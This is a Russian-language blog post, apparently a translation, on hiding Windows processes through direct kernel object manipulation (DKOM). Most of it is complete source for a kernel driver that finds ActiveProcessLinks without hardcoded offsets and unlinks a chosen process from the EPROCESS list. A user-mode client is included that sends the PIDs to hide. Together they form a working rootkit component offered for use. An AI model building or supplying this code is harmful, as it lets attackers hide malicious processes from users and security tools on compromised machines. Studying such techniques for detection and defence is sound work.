---
layout: post
title: Сокрытие процесса с помощью DKOM
category: [translations]
tag: [windows, malware]
---

DKOM - это техника, используемая некоторыми ядерными руткитами для сокрытия запущенного процесса. 
При сокрытии процесса, используя DKOM, руткит изменяет поля Flink и Blink у ActiveProcessLinks в структуре EPROCESS. 
Чтобы получить доступ к полям ActiveProcessLinks, руткит должен знать его смещение. 
Проблема заключается в том, что смещение ActiveProcessLinks в EPROCESS различается для каждой версии Windows, 
и руткиту необходимо хардкодить смещения и определять версию системы при скрытии процессов.

Однако, я нашел решение этой проблемы. 
После некоторых поисков в интернете, я обнаружил, что поле ActiveProcessLinks всегда находится рядом с полем UniqueProcessId структуры EPROCESS. 
Благодаря этому, мы можем найти расположение ActiveProcessLinks, найдя PID в структуре EPROCESS, таким образом, избегая жестко закодированных смещений.

Следующий драйвер скрывает процессы, используя DKOM, без хардкодинга смещений.

```cpp
#include <ntifs.h>
#include <ntddk.h>
 
UNICODE_STRING DeviceName=RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver"),SymbolicLink=RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
PDEVICE_OBJECT pDeviceObject;
 
void Unload(PDRIVER_OBJECT pDriverObject)
{
    IoDeleteSymbolicLink(&SymbolicLink);
    IoDeleteDevice(pDriverObject->DeviceObject);
}
 
NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject,PIRP irp)
{
    PIO_STACK_LOCATION io;
    PVOID buffer;
    PEPROCESS Process;
 
    PULONG ptr;
    PLIST_ENTRY PrevListEntry,CurrListEntry,NextListEntry;
 
    NTSTATUS status;
    ULONG i,offset;
 
    io=IoGetCurrentIrpStackLocation(irp);
    irp->IoStatus.Information=0;
    offset=0;
 
    switch(io->MajorFunction)
    {
        case IRP_MJ_CREATE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_CLOSE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_READ:
            status=STATUS_SUCCESS;
        case IRP_MJ_WRITE:
 
            buffer=MmGetSystemAddressForMdlSafe(irp->MdlAddress,NormalPagePriority);
 
            if(!buffer)
            {
                status=STATUS_INSUFFICIENT_RESOURCES;
                break;
            }
 
            DbgPrint("Process ID: %d",*(PHANDLE)buffer);
 
            if(!NT_SUCCESS(status=PsLookupProcessByProcessId(*(PHANDLE)buffer,&Process)))
            {
                DbgPrint("Error: Unable to open process object (%#x)",status);
                break;
            }
 
            DbgPrint("EPROCESS address: %#x",Process);
            ptr=(PULONG)Process;
 
            // Сканируем структуру EPROCESS, для нахождения PID
 
            for(i=0;i<512;i++)
            {
                if(ptr[i]==*(PULONG)buffer)
                {
                    offset=(ULONG)&ptr[i+1]-(ULONG)Process; // ActiveProcessLinks находится рядом с PID
 
                    DbgPrint("ActiveProcessLinks offset: %#x",offset);
                    break;
                }
            }
 
            if(!offset)
            {
                status=STATUS_UNSUCCESSFUL;
                break;
            }
 
            CurrListEntry=(PLIST_ENTRY)((PUCHAR)Process+offset); // Получаем адрес ActiveProcessLinks
 
            PrevListEntry=CurrListEntry->Blink;
            NextListEntry=CurrListEntry->Flink;
 
            // Удаляем целевой процесс из списка процессов
            PrevListEntry->Flink=CurrListEntry->Flink;
            NextListEntry->Blink=CurrListEntry->Blink;
 
            // Указываем поля Flink и Blink на себя
 
            CurrListEntry->Flink=CurrListEntry;
            CurrListEntry->Blink=CurrListEntry;
 
            ObDereferenceObject(Process); // Освобождаем целевой процесс
 
            status=STATUS_SUCCESS;
            irp->IoStatus.Information=sizeof(HANDLE);
 
            break;
 
        default:
            status=STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
 
    irp->IoStatus.Status=status;
 
    IoCompleteRequest(irp,IO_NO_INCREMENT);
    return status;
}
 
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
    ULONG i;
     
    IoCreateDevice(pDriverObject,0,&DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&pDeviceObject);
    IoCreateSymbolicLink(&SymbolicLink,&DeviceName);
 
    pDriverObject->DriverUnload=Unload;
 
    for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
    {
        pDriverObject->MajorFunction[i]=DriverDispatch;
    }
 
    pDeviceObject->Flags&=~DO_DEVICE_INITIALIZING;
    pDeviceObject->Flags|=DO_DIRECT_IO;
 
    return STATUS_SUCCESS;
}
```

Следующее юзермод приложение используется для управления драйвером

```cpp
#include <stdio.h>
#include <Windows.h>
 
int main()
{
    HANDLE hFile;
    DWORD ProcessId,write;
 
    hFile=CreateFile("\\\\.\\DKOM_Driver",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 
    if(hFile==INVALID_HANDLE_VALUE)
    {
        printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.",GetLastError());
        return -1;
    }
 
    while(1)
    {
        printf("\nEnter PID: ");
        scanf("%d",&ProcessId);
 
        if(!WriteFile(hFile,&ProcessId,sizeof(DWORD),&write,NULL))
        {
            printf("\nError: Unable to hide process (%d)\n",GetLastError());
        }
 
        else
        {
            printf("\nProcess successfully hidden.\n");
        }
    }
 
    return 0;
}
```